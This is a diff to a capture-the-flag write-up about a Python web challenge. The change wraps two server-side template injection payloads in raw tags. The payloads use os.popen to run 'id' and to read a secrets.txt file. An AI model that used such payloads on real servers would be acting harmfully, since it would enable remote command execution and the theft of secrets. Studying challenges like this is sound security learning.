@@ -192,7 +192,7 @@ Noticed that the server are using Python, I tried **Server-Side Template Injecti
 This is the payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
 
 ```python
-{{namespace.__init__.__globals__.os.popen('id').read()}}
+{% raw %}{{namespace.__init__.__globals__.os.popen('id').read()}}{% endraw %}
 ```
 
 After that, I take JWT session, decode it and decode the inside base64. And it actually works
@@ -200,7 +200,7 @@ After that, I take JWT session, decode it and decode the inside base64. And it a
 Now I just need to `cat secrets.txt` file
 
 ```python
-{{namespace.__init__.__globals__.os.popen('cat secrets.txt').read()}}
+{% raw %}{{namespace.__init__.__globals__.os.popen('cat secrets.txt').read()}}{% endraw %}
 ```
 
 ![flag](Web/img/mrchatbot-flag.png)
